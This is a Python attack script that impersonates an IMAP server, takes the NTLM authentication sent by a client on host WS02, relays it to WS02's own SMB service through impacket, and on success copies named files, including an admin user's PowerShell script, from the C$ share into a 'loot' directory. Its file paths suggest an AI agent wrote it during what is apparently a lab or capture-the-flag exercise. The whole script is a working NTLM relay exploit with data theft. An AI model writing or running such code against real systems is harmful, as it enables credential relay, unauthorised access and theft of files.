#!/usr/bin/env python3
"""Relay the NTLM authentication from the WS02 IMAP poller into WS02's own SMB."""
import socket, ssl, threading, base64, datetime, sys
from urllib.parse import urlparse
from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
from impacket.ntlm import NTLMAuthChallenge
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets

LISTEN_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 1143
TARGET      = sys.argv[2] if len(sys.argv) > 2 else "smb://127.0.0.1"
TPORT       = int(sys.argv[3]) if len(sys.argv) > 3 else 445
CERT, KEY   = "server-bundle.pem", "server.key"
CAPS = ("IMAP4rev1 XLIST SPECIAL-USE UNSELECT UIDPLUS IDLE LITERAL+ ENABLE MOVE "
        "ESEARCH SEARCHRES LIST-EXTENDED LIST-STATUS STATUS=SIZE NAMESPACE "
        "IMAP4rev2 STARTTLS AUTH=NTLM AUTH=LOGIN")

def log(m):
    print("[%s] %s" % (datetime.datetime.now().strftime("%H:%M:%S"), m), flush=True)

def rline(s):
    b = b""
    while not b.endswith(b"\n"):
        d = s.recv(1)
        if not d:
            break
        b += d
    return b

class Cfg:
    # minimal stand-in for ntlmrelayx's NTLMRelayxConfig
    def __init__(self):
        self.smb2support = True
        self.outputFile = None
        self.exeFile = None
        self.command = None
        self.interactive = False
        self.enumLocalAdmins = False
        self.remove_mic = False
        self.remove_target = False
        self.serverName = None
        self.dumpdomain = True
        self.SMBServerChallenge = None

def handle(c, addr):
    tls = False
    relay = None
    try:
        c.settimeout(40)
        c.sendall(("* OK [CAPABILITY %s] Service ready\r\n" % CAPS).encode())
        while True:
            raw = rline(c)
            if not raw:
                break
            s = raw.decode("utf-8", "replace").strip()
            p = s.split(" ")
            tag, cmd = p[0], (p[1].upper() if len(p) > 1 else "")
            log("imap %s >> %s" % ("TLS" if tls else "PLAIN", s))

            if cmd == "STARTTLS" and not tls:
                c.sendall(("%s OK begin TLS negotiation now\r\n" % tag).encode())
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(CERT, KEY)
                try:
                    ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
                except Exception:
                    pass
                c = ctx.wrap_socket(c, server_side=True)
                tls = True
                continue

            if cmd == "CAPABILITY":
                c.sendall(("* CAPABILITY %s\r\n%s OK CAPABILITY done\r\n" % (CAPS, tag)).encode())
                continue

            if cmd == "AUTHENTICATE" and len(p) > 2 and p[2].upper() == "NTLM":
                c.sendall(b"+ \r\n")
                t1 = base64.b64decode(rline(c).strip())
                log("got Type1 from client (%d bytes)" % len(t1))

                relay = SMBRelayClient(Cfg(), urlparse(TARGET), targetPort=TPORT)
                relay.initConnection()
                log("SMB connection to %s opened" % TARGET)

                chal = relay.sendNegotiate(t1)
                blob = chal.getData() if hasattr(chal, "getData") else bytes(chal)
                log("got Type2 challenge from WS02 (%d bytes)" % len(blob))

                c.sendall(b"+ " + base64.b64encode(blob) + b"\r\n")
                t3 = base64.b64decode(rline(c).strip())
                log("got Type3 from client (%d bytes), forwarding to WS02" % len(t3))

                ok, err = relay.sendAuth(t3)
                log("SMB auth result: ok=%r err=%r" % (ok, err))
                if ok:
                    log("*** RELAY SUCCESS, authenticated SMB session on WS02")
                    global DONE
                    if not DONE:
                        DONE = True
                        threading.Thread(target=attack, args=(relay.session,), daemon=True).start()
                c.sendall(("%s NO temporary failure, retry later\r\n" % tag).encode())
                continue

            if cmd == "LOGOUT":
                c.sendall(("* BYE\r\n%s OK LOGOUT done\r\n" % tag).encode())
                break
            c.sendall(("%s BAD unsupported\r\n" % tag).encode())
    except Exception as e:
        log("err %r" % (e,))
    finally:
        try:
            c.close()
        except Exception:
            pass

DONE = False

OUT="/tmp/claude-1000/-home-ice-Desktop-season-12-AutoPilot/1cb51dff-0a96-499f-896d-b1100967752e/scratchpad/loot/"

TARGETS = [
    "Users\\stephanie.lewis\\Videos\\runas.exe",
    "Users\\da-stephanie.lewis\\Documents\\tb_bounce.ps1",
    "Program Files\\Mozilla Thunderbird\\interesting_serverknobs.json",
]

def grab(smb, path):
    import io, os
    os.makedirs(OUT, exist_ok=True)
    name = path.split("\\")[-1]
    buf = io.BytesIO()
    try:
        smb.getFile("C$", path, buf.write)
        data = buf.getvalue()
        open(OUT + name, "wb").write(data)
        log(">>> saved %s (%d bytes) -> %s" % (path, len(data), OUT + name))
    except Exception as e:
        log(">>> FAILED %s: %r" % (path, e))

def attack(smb):
    try:
        for t in TARGETS:
            grab(smb, t)
        log(">>> dump complete")
    except Exception as e:
        log("attack failed: %r" % e)

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", LISTEN_PORT))
srv.listen(8)
log("relay listening on 127.0.0.1:%d -> %s:%d" % (LISTEN_PORT, TARGET, TPORT))
while True:
    conn, a = srv.accept()
    threading.Thread(target=handle, args=(conn, a), daemon=True).start()
